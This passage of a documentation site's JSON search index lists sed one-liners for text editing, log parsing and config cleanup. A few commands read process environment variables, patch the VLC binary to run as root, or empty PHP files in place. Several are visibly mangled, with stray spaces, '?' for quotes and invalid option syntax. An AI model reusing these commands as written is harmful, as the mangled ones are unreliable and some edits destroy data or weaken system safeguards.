lookups"},{"location":"linux/sed/#a-find-and-replace-within-text-based-files","text":"sed -i 's/http:\\/\\/old\\/new\\///g' index.html","title":"a find and replace within text-based files"},{"location":"linux/sed/#remove-superfluous-from-conf-file","text":"sed -re '/^#/d ; s/#.*$// ; /^\\s*$/d'","title":"Remove superfluous from conf file"},{"location":"linux/sed/#to-display-number-of-lines-in-a-file-without-using-wc-command","text":"sed -n \" $ =\" fileName","title":"to display number of lines in a file without using wc command"},{"location":"linux/sed/#remove-all-leading-and-trailing-slashes-on-each-line-of-a-text-file","text":"sed -e \"s,/\\+ $ ,,\" -e \"s,^/\\+,,\" file.txt","title":"Remove all leading and trailing slashes on each line of a text file"},{"location":"linux/sed/#extract-all-urls-from-the-last-firefox-sessionstorejs-file-used","text":"sed -e 's/{\"url\":/\\n&/g' ~/.mozilla/firefox/*/sessionstore.js | cut -d \\\" -f4","title":"Extract all urls from the last firefox sessionstore.js file used."},{"location":"linux/sed/#prints-line-numbers","text":"sed '/./=' infile | sed '/^/N; s/\\n/ /'","title":"prints line numbers"},{"location":"linux/sed/#bold-matching-string-without-skipping-others","text":"sed 's/pattern/^[[1m&^[[0m/g'","title":"Bold matching string without skipping others"},{"location":"linux/sed/#print-line-numbers","text":"sed = <file> | sed 'N;s/\\n/\\t/'","title":"Print line numbers"},{"location":"linux/sed/#print-just-line-4-from-a-textfile","text":"sed '4!d'","title":"Print just line 4 from a textfile"},{"location":"linux/sed/#remove-trailing-whitespaces-or-tabs-from-a-text-file","text":"sed -i 's/[ \\t]\\+$//g' file.txt","title":"Remove trailing whitespaces (or tabs) from a text file"},{"location":"linux/sed/#remove-cr-lf-from-a-text-file","text":"sed -i 's/\\r\\n//' file.txt","title":"Remove CR LF from a text file"},{"location":"linux/sed/#turn-url-and-link-text-into-a-hyperlink","text":"sed \"s/\\([a-zA-Z]*\\:\\/\\/[^,]*\\),\\(.*\\)/\\<a href=\\\"\\1\\\"\\>\\2\\<\\/a\\>/\"","title":"turn url and link text into a hyperlink"},{"location":"linux/sed/#convert-all-tabs-in-a-file-to-spaces-assuming-the-tab-width-is-2","text":"sed -i 's/\\t/ /g' yourfile","title":"Convert all tabs in a file to spaces, assuming the tab width is 2"},{"location":"linux/sed/#convert-unix-newlines-to-dos-newlines","text":"sed 's/$' \"/`echo \\\\\\r`/\"","title":"convert Unix newlines to DOS newlines"},{"location":"linux/sed/#print-all-lines-containing-the-word-jan-to-a-new-file","text":"sed -n '/jan\\|Jan\\|JAN\\|JAn\\|jAn\\|jAN\\|jaN/p' data.txt > jan-only-data.txt","title":"Print all lines containing the word 'jan' to a new file."},{"location":"linux/sed/#put-all-lines-in-comment-where-de-word-debug-is-found","text":"sed -i 's/^.*DEBUG.*/#&/' $file","title":"put all lines in comment where de word DEBUG is found"},{"location":"linux/sed/#extract-a-bash-function","text":"sed -n '/^function h\\(\\)/,/^}/p' script.sh","title":"Extract a bash function"},{"location":"linux/sed/#remove--color--special--escape--ansi--codes-from-text-with-sed","text":"sed \"s,\\x1B\\[[0-9;]*[a-zA-Z],,g\"","title":"Remove ( color / special / escape / ANSI ) codes, from text, with sed"},{"location":"linux/sed/#list-your-largest-installed-packages-on-debianubuntu","text":"sed -ne '/^Package: \\(.*\\)/{s//\\1/;h;};/^Installed-Size: \\(.*\\)/{s//\\1/;G;s/\\n/ /;p;}' /var/lib/dpkg/status | sort -rn","title":"List your largest installed packages (on Debian/Ubuntu)"},{"location":"linux/sed/#delete-an-hard-disk-entry-in-virtualbox-registry","text":"sed -i '/Centos/d' VirtualBox.xml","title":"Delete an hard disk entry in Virtualbox registry"},{"location":"linux/sed/#count-the-number-of-times-you-match-a-substring-in-a-larger-text-file","text":"sed ?s/ [ sub_str ] / [ sub_str ] \\n /g? [ text_file ] | wc -l","title":"count the number of times you match a substring in a larger text file"},{"location":"linux/sed/#get-rid-of-multiple-spacestabs-in-a-text-file","text":"sed -i \"s/\\s*/ /g;s/\\s* $ //\" input_file","title":"Get rid of multiple spaces/tabs in a text file"},{"location":"linux/sed/#list-all-available-disks-and-disk-partitions","text":"sed 's/#.*//' /etc/fstab | column -t","title":"list all available disks and disk partitions"},{"location":"linux/sed/#top-10-commands-used","text":"sed -e 's/ *$//' ~/.bash_history | sort | uniq -cd | sort -nr | head","title":"top 10 commands used"},{"location":"linux/sed/#display-a-block-of-text-with-awk","text":"sed -n /start_pattern/,/stop_pattern/p file.txt","title":"Display a block of text with AWK"},{"location":"linux/sed/#show-a-script-or-config-file-without-comments","text":"sed -e '/^[[:blank:]]*#/d; s/[[:blank:]][[:blank:]]*#.*//' -e '/^$/d' -e '/^\\/\\/.*/d' -e '/^\\/\\*/d;/^ \\* /d;/^ \\*\\//d' /a/file/with/comments","title":"Show a script or config file without comments"},{"location":"linux/sed/#print-file-content-in-reverse-order","text":"sed -n '1!G;h;$p' techie.txt","title":"Print file content in reverse order"},{"location":"linux/sed/#remove-blank-lines-from-a-file-and-save-output-to-new-file","text":"sed '/^$/d' file >newfile","title":"Remove blank lines from a file and save output to new file"},{"location":"linux/sed/#delete-first-x-lines-of-a-file","text":"sed '1,55d'","title":"delete first X lines of a file"},{"location":"linux/sed/#get-rid-of-multiple-spacestabs-in-a-text-file_1","text":"sed -i \"s/\\(\\x09\\{1,\\}\\)\\|\\( \\{1,\\}\\)/ /g;s/\\(\\x09\\{1,\\} $ \\)\\|\\( \\{1,\\} $ \\)//g\" brisati.txt","title":"Get rid of multiple spaces/tabs in a text file"},{"location":"linux/sed/#empty-set-of-files","text":"sed -i -n '/%/p' *.php","title":"empty set of files"},{"location":"linux/sed/#remove-a-line-from-a-file-using-sed-useful-for-updating-known-ssh-server-keys-when-they-change","text":"sed '${LINE}d' ~/.ssh/known_host","title":"Remove a line from a file using sed (useful for updating known SSH server keys when they change)"},{"location":"linux/sed/#run-vlc-as-root","text":"sed -i 's/geteuid/getppid/g' /usr/bin/vlc","title":"run vlc as root"},{"location":"linux/sed/#convert-dos-newlines-to-unix-newlines","text":"sed 's/$//'","title":"convert DOS newlines to unix newlines"},{"location":"linux/sed/#backup-a-file-before-editing-it","text":"sedit () { cp \" $* \" { ,.bk } ; which $EDITOR > /dev/null && $EDITOR \" $* \" || vim \" $* \" ; }","title":"Backup a file before editing it."},{"location":"linux/sed/#optimized-sed","text":"sed '/foo/ s/foo/foobar/g' <filename>","title":"optimized sed"},{"location":"linux/sed/#remove--from-configuration-files","text":"sed -i -e 's/^#$//g' /path/to/file","title":"Remove \"#' from configuration files."},{"location":"linux/sed/#remove-comments-from-files","text":"sed -e '/^#/d' -e 's/#.*$//' in","title":"Remove comments from files"},{"location":"linux/sed/#remove-all-html-tags-from-a-file","text":"sed \"s/<[^>]\\+>//g\" file","title":"Remove all HTML tags from a file"},{"location":"linux/sed/#update-zone-file-serial-numbers","text":"sed -i 's/20[0-1][0-9]\\{7\\}/' ` date +%Y%m%d%I ` '/g' *.db","title":"Update zone file Serial numbers"},{"location":"linux/sed/#remove-a-line-in-a-text-file-useful-to-fix-ssh-host-key-change-warnings","text":"sed -i 8d ~/.ssh/known_hosts","title":"Remove a line in a text file. Useful to fix \"ssh host key change\" warnings"},{"location":"linux/sed/#remove-a-line-from-a-file-using-sed-useful-for-updating-known-ssh-server-keys-when-they-change_1","text":"sed -i '${LINE}d' ~/.ssh/known_host","title":"Remove a line from a file using sed (useful for updating known SSH server keys when they change)"},{"location":"linux/sed/#see-the-10-programs-the-most-used","text":"sed -e \"s/| /\\n/g\" ~/.bash_history | cut -d ' ' -f 1 | sort | uniq -c | sort -nr | head","title":"See the 10 programs the most used"},{"location":"linux/sed/#separate-emphasize-digital-strings-from-other-text","text":"sed 's/[0-9]\\+/ [&] /g'","title":"separate (emphasize) digital strings from other text"},{"location":"linux/sed/#print-all-lines-between-two-line-numbers","text":"sed -n '3,6p' /path/to/file","title":"Print all lines between two line numbers"},{"location":"linux/sed/#insert-a-colon-between-every-two-digits","text":"sed 's/\\(..\\)/\\1:/g;s/:$//' mac_address_list","title":"Insert a colon between every two digits"},{"location":"linux/sed/#regex-to-remove-html-tags-from-a-file","text":"sed -e :a -e 's/<[^>]*>//g;/</N;//ba' index.html","title":"Regex to remove HTML-Tags from a file"},{"location":"linux/sed/#regex-for-turning-a-url-into-a-real-hyperlink-ie-for-posting-somewhere-that-accepts-basic-html","text":"sed \"s/\\([a-zA-Z]*\\:\\/\\/[^ ]*\\)\\(.*\\)/\\<a href=\\\"\\1\\\"\\>\\1\\<\\/a\\>\\2/\"","title":"regex for turning a URL into a real hyperlink (i.e. for posting somewhere that accepts basic html)"},{"location":"linux/sed/#shows-cpu-load-in-percent","text":"sed -e 's/ .*//' -e 's/\\.//' -e 's/^0*//' /proc/loadavg","title":"Shows cpu load in percent"},{"location":"linux/sed/#apply-substitution-only-on-the-line-following-a-marker","text":"sed '/MARKER/{N;s/THIS/THAT/}'","title":"Apply substitution only on the line following a marker"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed","text":"sed -r \"s/\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#comment-out-a-line-in-a-file","text":"sed -i '19375 s/^/#/' file","title":"Comment out a line in a file"},{"location":"linux/sed/#simplification-of-sed-your-sed-stuff-here-file--file2--mv-file2-file","text":"sed -i 'your sed stuff here' file","title":"Simplification of \"sed 'your sed stuff here' file &gt; file2 &amp;&amp; mv file2 file\""},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_1","text":"sed -r \"s:\\x1B\\[[0-9;]*[mK]::g\" '","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#prepend-a-text-to-a-file","text":"sed -i '1s/^/text to prepend\\n/' file1","title":"Prepend a text to a file."},{"location":"linux/sed/#delete-line-number-10-from-file","text":"sed -i '10d' <somefile>","title":"Delete line number 10 from file"},{"location":"linux/sed/#remove-empty-lines","text":"sed '/^$/d'","title":"remove empty lines"},{"location":"linux/sed/#convert-files-from-dos-line-endings-to-unix-line-endings","text":"sed -i 's/^M//' file","title":"Convert files from DOS line endings to UNIX line endings"},{"location":"linux/sed/#remove-leading-blank-lines","text":"sed '/./,$!d'","title":"remove leading blank lines"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_2","text":"sed -r \"s/\\x1B\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#convert-unix-newlines-to-dos-newlines_1","text":"sed 's/$/<ctrl+v><ctrl+m>/'","title":"Convert Unix newlines to DOS newlines"},{"location":"linux/sed/#reverse-order-of-file","text":"sed '1!G;h;$!d'","title":"reverse order of file"},{"location":"linux/sed/#remove-the-first-character-of-each-line-in-a-file","text":"sed \"s/^.//g\" files","title":"Remove the first character of each line in a file"},{"location":"linux/sed/#delete-last-line-of-a-file-if-it-is-blank","text":"sed '${/^$/d}' file","title":"Delete Last Line of a File if it is Blank"},{"location":"linux/sed/#simple-xml-tag-extract-with-sed","text":"sed -n 's/.*<foo>\\([^<]*\\)<\\/foo>.*/\\1/p'","title":"Simple XML tag extract with sed"},{"location":"linux/sed/#perform-sed-substitution-on-all-but-the-last-line-of-input","text":"sed -e \" $ ! s/ $ /,/\"","title":"Perform sed substitution on all but the last line of input"},{"location":"linux/sed/#remove-empty-lines-in-place-with-backup","text":"sed -e '/^$/d' -i .bak filewithempty.lines","title":"remove empty lines in place with backup"},{"location":"linux/sed/#print-all-the-lines-between-10-and-20-of-a-file","text":"sed '10,20!d'","title":"Print all the lines between 10 and 20 of a file"},{"location":"linux/sed/#efficiently-print-a-line-deep-in-a-huge-log-file","text":"sed '1000000!d;q' < massive-log-file.log","title":"Efficiently print a line deep in a huge log file"},{"location":"linux/sed/#extract-title-from-html-files","text":"sed -n 's/.*<title>\\(.*\\)<\\/title>.*/\\1/ip;T;q' file.html","title":"Extract title from HTML files"},{"location":"linux/sed/#grep--v-with-multiple-patterns","text":"sed '/test/{/error\\|critical\\|warning/d}' somefile","title":"grep -v with multiple patterns."},{"location":"linux/sed/#a-find-and-replace-within-text-based-files-for-batch-text-replacement-not-using-perl","text":"sed -i -e 's/SEARCH_STRING/REPLACE_STRING/g' ` find . -iname 'FILENAME' `","title":"a find and replace within text-based files, for batch text replacement, not using perl"},{"location":"linux/sed/#go-to-the-nth-line-of-file","text":"sed -n 13p /etc/services","title":"Go to the Nth line of file"},{"location":"linux/sed/#add-thousand-separator-with-sed-in-a-file-or-within-pipe","text":"sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta' filename","title":"Add thousand separator with sed, in a file or within pipe"},{"location":"linux/sed/#append-empty-line-after-every-line-in-filetxt","text":"sed G file.txt","title":"append empty line after every line in file.txt"},{"location":"linux/sed/#efficiently-extract-lines-between-markers","text":"sed -n '/START/,${/STOP/q;p}'","title":"Efficiently extract lines between markers"},{"location":"linux/sed/#change-the-homepage-of-firefox","text":"sed -i 's|\\(\"browser.startup.homepage\",\\) \"\\(.*\\)\"|\\1 \"http://sliceoflinux.com\"|' .mozilla/firefox/*.default/prefs.js","title":"Change the homepage of Firefox"},{"location":"linux/sed/#sed-edit-in-place-using--a-option-instead-of--i-option-no-tmp-file-created","text":"sedi (){ case $# in [ 01 ] | [ 3 -9 ]) echo usage: sedi sed-cmds file ;; 2 ) sed -a '' \" $1 \" ';H;$!d;g;' $2 | sed -a '/^$/d;w ' \" $2 \" '' ;; esac ; }","title":"sed edit-in-place using -a option instead of -i option (no tmp file created)"},{"location":"linux/sed/#remove-a-range-of-lines-from-a-file","text":"sed -i <file> -re '<start>,<end>d'","title":"Remove a range of lines from a file"},{"location":"linux/sed/#gives-you-whats-between-first-string-and-second-string-included","text":"sed \"s/^ABC/+ABC/\" <file | sed \"s/DEF $ /DEF+/\" | tr \"\\n\" \"~\" | tr \"+\" \"\\n\" | grep \"^ABC\" | tr \"~\" \"\\n\"","title":"Gives you what's between first string and second string included."},{"location":"linux/sed/#remove-blank-lines","text":"sed '/^$/d'","title":"Remove blank lines"},{"location":"linux/sed/#deleting--ignoring-lines-from-the-top-of-a-file","text":"sed 1d foo.txt","title":"Deleting / Ignoring lines from the top of a file"},{"location":"linux/sed/#extract-ip-addresses-with-sed","text":"sed -n 's/\\([0-9]\\{1,3\\}\\.\\)\\{3\\}[0-9]\\{1,3\\}/\\nip&\\n/gp' ips.txt | grep ip | sed 's/ip//' | sort | uniq","title":"Extract ip addresses with sed"},{"location":"linux/sed/#remove-lines-which-are-longer-than-255","text":"sed -n '/^.\\{255\\}/!p'","title":"remove lines which are longer than 255"},{"location":"linux/sed/#grep--v-with-multiple-patterns_1","text":"sed -n '/test/{/error\\|critical\\|warning/d;p}' somefile","title":"grep -v with multiple patterns."},{"location":"linux/sed/#remove-leading-zeros-in-multiple-columns-with-sed","text":"sed 's/\\b\\(0*\\)//g' filename","title":"Remove leading zeros in multiple columns with sed"},{"location":"linux/sed/#output-the-contents-of-a-file-removing-any-empty-lines-including-lines-which-contain-only-spaces-or-tabs","text":"sed -e '/^[<space><tab>]*$/d' somefile","title":"output the contents of a file removing any empty lines including lines which contain only spaces or tabs."},{"location":"linux/sed/#extract-all-urls-from-firefox-sessionstore","text":"sed -e \"s/\\[{/\\n/g\" -e \"s/}, {/\\n/g\" sessionstore.js | grep url | awk -F \",\" '{ print $1 }' | sed -e \"s/url:\\\"\\([^\\\"]*\\)\\\"/\\1/g\" -e \"/^about:blank/d\" > session_urls.txt","title":"extract all urls from firefox sessionstore"},{"location":"linux/sed/#print-contents-of-file-from-line-1-until-we-match-regex","text":"sed -n '1,/regex/p' filename","title":"print contents of file from line 1 until we match regex"},{"location":"linux/sed/#preprocess-code-to-be-posted-in-comments-on-this-site","text":"sed 's/^/$ /' \" $script \" | xclip","title":"preprocess code to be posted in comments on this site"},{"location":"linux/sed/#quick-and-dirty-formatting-for-html-code","text":"sed -r 's_(/[^>]*?>)_\\1\\n_g' filename.html","title":"quick and dirty formatting for HTML code"},{"location":"linux/sed/#do-a-search-and-replace-in-a-file-after-making-a-backup","text":"sed -i.bak 's/old/new/g' file","title":"Do a search-and-replace in a file after making a backup"},{"location":"linux/sed/#concatenates-lines-using-sed","text":"sed -e :a -e '/$/N;s/\\n/ /;ta' <filename>","title":"Concatenates lines using sed"},{"location":"linux/sed/#replace-multiple-spaces-with-semicolon","text":"sed \"s/\\s\\+/;/g;s/^ //;s/ $ //\" filename.csv","title":"Replace multiple spaces with semicolon"},{"location":"linux/sed/#change-every-instance-of-old-to-new-in-file-file","text":"sed -i 's/OLD/NEW/g' FILE","title":"Change every instance of OLD to NEW in file FILE"},{"location":"linux/sed/#convert-dos-newlines-crlf-to-unix-format","text":"sed 's/^M$//' input.txt > output.txt","title":"Convert DOS newlines (CR/LF) to Unix format"},{"location":"linux/sed/#embed-next-line-on-the-end-of-current-line-using-sed","text":"sed 'X{N;s/\\n//;}' file.txt ( where X is the current line )","title":"Embed next line on the end of current line using sed"},{"location":"linux/sed/#remove-newlines-from-specific-lines-in-a-file-using-sed","text":"sed -i '/pattern/N; s/\\n//' filename","title":"remove newlines from specific lines in a file using sed"},{"location":"linux/sed/#capitalize-the-first-letter-of-every-word","text":"sed \"s/\\b\\(.\\)/\\u\\1/g\"","title":"Capitalize the first letter of every word"},{"location":"linux/sed/#show-a-config-file-without-comments","text":"sed -e 's/#.*//;/^\\s*$/d'","title":"Show a config file without comments"},{"location":"linux/sed/#top-20-commands-in-your-bash-history","text":"sed -e 's/[;|][[:space:]]*/\\n/g' .bash_history | cut delimiter = ' ' fields = 1 | sort | uniq count | sort numeric-sort reverse | head lines = 20","title":"Top 20 commands in your bash history"},{"location":"linux/sed/#update-grub-menulst","text":"sed -e '/^$/d' -e '/^#/d' -e '/initrd/ a\\ ' -e 's/hiddenmenu//g' -e '/^timeout/d' -e '/default/ a\\timeout\\t\\t15' -e 's/quiet//g' -e 's/splash/rootdelay=60/g' /boot/grub/menu.lst > /boot/grub/menu.lst.new","title":"Update grub menu.lst"},{"location":"linux/sed/#delete-all-leading-and-trailing-whitespace-from-each-line-in-file","text":"sed 's/^[ \\t]*//;s/[ \\t]*$//' -i file","title":"delete all leading and trailing whitespace from each line in file"},{"location":"linux/sed/#remove-space-andor-tab-characters-at-the-end-of-line","text":"sed -i 's/[ \\t]*$//' file","title":"Remove space and/or tab characters at the end of line"},{"location":"linux/sed/#delete-all-trailing-whitespace-from-each-line-in-file","text":"sed -i 's/^\\s\\+//' <file>","title":"delete all trailing whitespace from each line in file"},{"location":"linux/sed/#display-email-addresses-that-have-been-sent-to-by-a-postfix-server-since-the-last-mail-log-rollover","text":"sed -n -e '/postfix\\/smtp\\[.*status=sent/s/^.*to=<\\([^>]*\\).*$/\\1/p' /var/log/mail.log | sort -u","title":"Display email addresses that have been sent to by a postfix server since the last mail log rollover"},{"location":"linux/sed/#given-process-id-print-its-environment-variables","text":"sed 's/\\o0/\\n/g' /proc/INSERT_PID_HERE/environ","title":"Given process ID print its environment variables"},{"location":"linux/sed/#print-only-the-odd-lines-of-a-file-gnu-sed","text":"sed 2 ~2d","title":"Print only the odd lines of a file (GNU sed)"},{"location":"linux/sed/#search-replace-with-ansible-style-timestamps","text":"sed -i. $( date +%F@%T ) 's/^LogLevel warn/LogLevel debug/g' httpd.conf","title":"Search replace with Ansible style timestamps"},{"location":"linux/sed/#exclude-inserting-a-table-from-a-sql-import","text":"sed '/INSERT INTO `unwanted_table`/d' mydb.sql > reduced.sql","title":"Exclude inserting a table from a sql import"},{"location":"linux/sed/#getting-a-domain-from-url-ex-very-nice-to-get-url-from-squid-accesslog","text":"sed -e \"s/[^/]*\\/\\/\\([^@]*@\\)\\?\\([^:/]*\\).*/\\2/\"","title":"Getting a domain from url, ex: very nice to get url from squid access.log"},{"location":"linux/sed/#multi-line-grep-using-sed-and-specifying-openclose-tags","text":"sed '/' \"<opening tag>\" '/,/' \"<closing tag>\" '/{/' \"<closing tag>\" '/d;p};d' \"<file>\"","title":"Multi line grep using sed and specifying open/close tags"},{"location":"linux/sed/#sed---substitute-string-in-next-line","text":"sed -i.backup '/patter/{n;s/foo/bar/g}' file","title":"SED - Substitute string in next line"},{"location":"linux/sed/#remove-repeated-pairs-of-characters-eg-xtxtxtxt-will-become-xt","text":"sed -ru 's/(..)\\1{2,}/\\1/g'","title":"remove repeated pairs of characters e.g. \"xtxtxtxt\" will become \"xt\""},{"location":"linux/sed/#delete-all-emptyblank-lines-from-text-file--output-to-file","text":"sed '/^$/d' /tmp/data.txt > /tmp/output.txt","title":"Delete all empty/blank lines from text file &amp; output to file"},{"location":"linux/sed/#fix-subtitle-timing-for-sub-files","text":"sed -e 's/{/|/' -e 's/}{/|/' -e 's/}/|/' myFile.sub | awk -F \"|\" 'BEGIN {OFS = \"|\"} { $2 = $2 - 600; $3 = $3 - 600; print $0 }' | sed -e 's/^|/{/' -e 's/\\([0-9]\\)|\\([0-9]\\)/\\1}{\\2/' -e 's/|/}/' >","title":"Fix subtitle timing (for .sub files)"},{"location":"linux/sed/#mysql-slice-out-a-specific-table-from-the-output-of-mysqldump","text":"sed -n \"/^ Table structure for table \\`departments\\`/,/^ Table structure for table/p\"","title":"MySQL: Slice out a specific table from the output of mysqldump"},{"location":"linux/sed/#comment-out-all-lines-in-a-file-beginning-with-string","text":"sed -i 's/^\\(somestring\\)/#\\1/' somefile.cfg","title":"Comment out all lines in a file beginning with string"},{"location":"linux/sed/#commentate-specified-line-of-a-file","text":"sed -i '<line_no>s/\\(.*\\)/#\\1/' <testfile>","title":"commentate specified line of a file"},{"location":"linux/sed/#remove-multiple-spaces","text":"sed \"s/^ *//;s/ * $ //;s/ \\{1,\\}/ /g\" filename.txt","title":"Remove multiple spaces"},{"location":"linux/sed/#simple-comment-an-entire-file","text":"sed -i 's/^/#/' FILENAME","title":"Simple Comment an entire file"},{"location":"linux/sed/#convert-a-python-interactive-session-to-a-python-script","text":"sed 's/^\\([^>.]\\)/#\\1/;s/^>>> //;s/^\\.\\.\\./ /'","title":"Convert a Python interactive session to a python script"},{"location":"linux/sed/#add-a-line-from-1-file-after-every-line-of-another-shuffle-files-together","text":"sed '/^/R addfile' targetfile > savefile","title":"Add a line from 1 file after every line of another (shuffle files together)"},{"location":"linux/sed/#print-contents-of-file-from-first-match-of-regex-to-end-of-file","text":"sed -n '/regex/,$p' filename","title":"print contents of file from first match of regex to end of file"},{"location":"linux/sed/#compute-the-numeric-sum-of-a-file","text":"sed i \"+\" file.txt | xargs echo 0 | bc","title":"Compute the numeric sum of a file"},{"location":"linux/sed/#delete-leading-whitespace-from-the-start-of-each-line","text":"sed 's/^[ \\t]*//' input.txt","title":"Delete leading whitespace from the start of each line"},{"location":"linux/sed/#delete-leading-whitespace-from-the-start-of-each-line_1","text":"sed 's/^\\s*//' input.txt","title":"Delete leading whitespace from the start of each line"},{"location":"linux/sed/#search-apache-virtual-host-by-pattern","text":"sed -n '/^[^#]*<Virtual/{:l N; /<\\/Virtual/!bl;}; /PATTERN/p' vhosts.conf","title":"Search apache virtual host by pattern"},{"location":"linux/sed/#terminal---show-directories-in-the-path-one-per-line-with-sed-and-bash3x-here-string","text":"sed 's/:/\\n/g' <<< $PATH","title":"Terminal - Show directories in the PATH, one per line with sed and bash3.X `here string'"},{"location":"linux/sed/#remove-a-range-of-lines-from-a-file_1","text":"sed -i <start>,<end>d <filename>","title":"Remove a range of lines from a file"},{"location":"linux/sed/#every-nth-line-position--sed","text":"sed -n '1,${p;n;n;}' foo > foo_every3_position1 ; sed -n '2,${p;n;n;}' foo > foo_every3_position2 ; sed -n '3,${p;n;n;}' foo > foo_every3_position3","title":"Every Nth line position # (SED)"},{"location":"linux/sed/#in-place-searchreplace-with-datestamped-backup","text":"sed -i. ` date +%Y%m%d ` -e 's/pattern/replace' [ filename ]","title":"In-Place search/replace with datestamped backup"},{"location":"linux/sed/#replace-spaces-in-a-file-with-hyphens","text":"sed -i 's/ /-/g' *","title":"Replace spaces in a file with hyphens"},{"location":"linux/sed/#delete-the-specified-line","text":"sed -i 8d ~/.ssh/known_hosts","title":"Delete the specified line"},{"location":"linux/sed/#change-host-name","text":"sed -i 's/oldname/newname/' /etc/hosts /etc/hostname","title":"Change host name"},{"location":"linux/sed/#print-just-line-4-from-a-textfile_1","text":"sed -n '4{p;q}'","title":"Print just line 4 from a textfile"},{"location":"linux/sed/#print-just-line-4-from-a-textfile_2","text":"sed -n '4p'","title":"Print just line 4 from a textfile"},{"location":"linux/sed/#cleanup-a-source-text-file-removing-trailing-spacestabs-and-multiple-consecutive-blank-lines","text":"sed -i -e 's/[ \\t]*$//;/^$/N;/\\n$/D' sourcefiletocleanup","title":"Cleanup a (source) text file, removing trailing spaces/tabs and multiple consecutive blank lines"},{"location":"linux/sed/#put-uppercase-letters-in-curly-brackets-in-a-bibtex-database","text":"sed '/^\\s*[^@%]/s=\\([A-Z][A-Z]*\\)\\([^}A-Z]\\|},$\\)={\\1}\\2=g' literature.bib > output.bib","title":"Put uppercase letters in curly brackets in a BibTeX database"},{"location":"linux/sed/#prepend-a-text-to-a-file_1","text":"sed -i 's/^/ls -l /' output_files.txt","title":"Prepend a text to a file."},{"location":"linux/sed/#edit-ruby-files-within-the-current-directory-to-use-ruby-19-style-symbol-keys-instead-of-rockets","text":"sed -i \"s/:\\([a-zA-Z_]*\\) =>/\\1:/g\" **/*.rb","title":"Edit Ruby files within the current directory to use Ruby 1.9+ style symbol keys instead of rockets"},{"location":"linux/sed/#uncomment-the-lines-where-the-word-debug-is-found_1","text":"sed 's/^#\\(.*DEBUG\\)/\\1/' $FILE","title":"uncomment the lines where the word DEBUG is found"},{"location":"linux/sed/#raspberry-pi-serial-number-wo-leading-zeros","text":"sed '$!d s/.*: 0\\+//' /proc/cpuinfo","title":"Raspberry Pi serial number w/o leading zeros"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_3","text":"sed -r \"s/(\\x1B|\\033)(\\(B|\\[([0-9]{1,2}(;[0-9]{1,2})?)?[A-Z])//Ig\"","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#urldecoding","text":"sed -e 's/%\\([0-9A-F][0-9A-F]\\)/\\\\\\\\\\x\\1/g' | xargs echo -e","title":"urldecoding"},{"location":"linux/sed/#remove-color-codes-special-characters-with-sed_4","text":"sed -r 's/' $( echo -e \"\\033\" ) '\\[[0-9]{1,2}(;([0-9]{1,2})?)?[mK]//g'","title":"Remove color codes (special characters) with sed"},{"location":"linux/sed/#replace-words-with-sed","text":"sed /BEGIN/,/END/s/xxx/yyy/g input.txt","title":"Replace words with sed"},{"location":"linux/sed/#rebuild-a-delimited-file-with-a-unique-delimiter","text":"sed 's/$/uniqueString/' file.old | sed 's/,/\\n/g' | sed ':loop;/^\\\"[^\\\"]*$/N;s/\\n/,/;/[^\\\"]$/t loop' | sed ':loop;N;s/\\n/@/g;/uniqueString$/!b loop;s/uniqueString$//' > file.new","title":"Rebuild a Delimited File with a Unique Delimiter"},{"location":"linux/sed/#delete-all-trailing-whitespace-from-each-line-in-file_1","text":"sed 's/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file>","title":"delete all trailing whitespace from each line in file"},{"location":"linux/sed/#delete-all-leading-and-trailing-whitespace-from-each-line-in-file_1","text":"sed 's/^[ \\t]*//;s/[ \\t]*$//' < <file> > <file>.out ; mv <file>.out <file>","title":"delete all leading and trailing whitespace from each line in file"},{"location":"linux/sed/#remove--r-carriage-return-in-a-file","text":"sed -i ' s/ \\r //g somefile.txt","title":"Remove  r (carriage return) in a file"},{"location":"linux/sed/#delete-all-leading-and-trailing-whitespace-from-each-line-in-file_2","text":"sed 's/^\\s*//;s/\\s*$//' -i file","title":"delete all leading and trailing whitespace from each line in file"},{"location":"linux/sed/#puts-every-word-from-a-file-into-a-new-line","text":"sed -r 's/[ \\t\\r\\n\\v\\f]+/\\^J/g' INFILE > OUTFILE","title":"Puts every word from a file into a new line"},{"location":"linux/sed/#change-your-e-mail-address-in-multiple-files","text":"sed -i 's/oldname@example.com/newname@example.com/g' ` grep oldname@example.com -rl . `","title":"Change your e-mail address in multiple files"},{"location":"linux/sed/#delete-all-lines-after-the-first-match","text":"sed -n -e '1,/match/p'","title":"Delete all lines after the first match"},{"location":"linux/sed/#extract-ip-addresses-with-sed_1","text":"sed -n 's/.*\\(\\(\\(^\\| \\)[0-9]\\{1,3\\}\\.\\)\\{1\\}\\([0-9]\\{1,3\\}\\.\\)\\{2\\}[0-9]\\{1,3\\}\\) .*/\\1/gp'","title":"Extract ip addresses with sed"},{"location":"linux/sed/#sed-replace-string-in-whole-files-in-folder","text":"sed -i 's/SearchString/ReplaceString/g' views/*.php","title":"sed replace string in whole files in folder"},{"location":"linux/sed/#bash-chop","text":"sed 's/.$//'","title":"bash chop"},{"location":"linux/sed/#printout-a-list-of-field-numbers-from-a-csv-file-with-headers-as-first-line","text":"sed 's/,/\\n/g;q' file.csv | nl","title":"Printout a list of field numbers from a CSV file with headers as first line."},{"location":"linux/sed/#remove-lines-that-contain-a-specific-pattern1-from-file2","text":"sed -i '/myexpression/d' /path/to/file.txt","title":"Remove lines that contain a specific pattern(\\(1) from file(\\)2)."},{"location":"linux/sed/#convert-windowsdos-text-files-to-unix","text":"sed -i 's/\\r//' <filename>","title":"Convert Windows/DOS Text Files to Unix"},{"location":"linux/sed/#insert-blank-lines","text":"sed G input.txt | cat -s","title":"insert blank lines"},{"location":"linux/sed/#removes-lines-range-from-file","text":"sed '1,5d' /path/to/file","title":"Removes lines [range] from file"},{"location":"linux/sed/#more-than-4-repeated-characters-to-a-single-character","text":"sed -ru 's/(.)\\1{4,}/\\1/g'","title":"more than 4 repeated characters to a single 